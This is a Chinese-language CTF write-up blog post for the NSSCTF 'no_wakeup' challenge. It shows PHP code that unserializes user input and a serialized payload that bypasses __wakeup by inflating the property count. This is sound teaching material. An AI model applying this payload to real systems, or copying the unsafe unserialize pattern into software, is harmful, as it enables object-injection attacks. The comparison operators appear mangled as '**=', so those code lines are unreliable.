---
title: NSSCTF Web 题解
date: 2025-07-15 10:00:00
author: Xendr1a
categories: [CTF题解, NSSCTF]
tags: [NSSCTF, Writeup]
description: NSSCTF Web 题解，包含题目思路、payload 与踩坑记录。
toc: true
---

## [SWPUCTF 2021 新生赛]no_wakeup

```text
<?php

header("Content-type:text/html;charset=utf-8");
error_reporting(0);
show_source("class.php");

class HaHaHa{

        public $admin;
        public $passwd;

        public function __construct(){
            $this->admin ="user";
            $this->passwd = "123456";
        }

        public function __wakeup(){
            $this->passwd = sha1($this->passwd);
        }

        public function __destruct(){
            if($this->admin **= "admin" && $this->passwd **= "wllm"){
                include("flag.php");
                echo $flag;
            }else{
                echo $this->passwd;
                echo "No wake up";
            }
        }
    }

$Letmeseesee = $_GET['p'];
unserialize($Letmeseesee);
```

注意到这一行

```text
public function __wakeup(){
            $this->passwd = sha1($this->passwd);
        }
```

会把我们的pass给SHA加密

```text
我们可以试试绕过他：
绕过 __wakeup 的执行
根据 PHP 反序列化特性：当序列化字符串中声明的对象属性数量大于实际属性数量时，__wakeup 方法不会被执行。
```

```text
$a=new HaHaHa();
echo serialize($a);
#O:6:"HaHaHa":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
#O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
就是改2为3
```
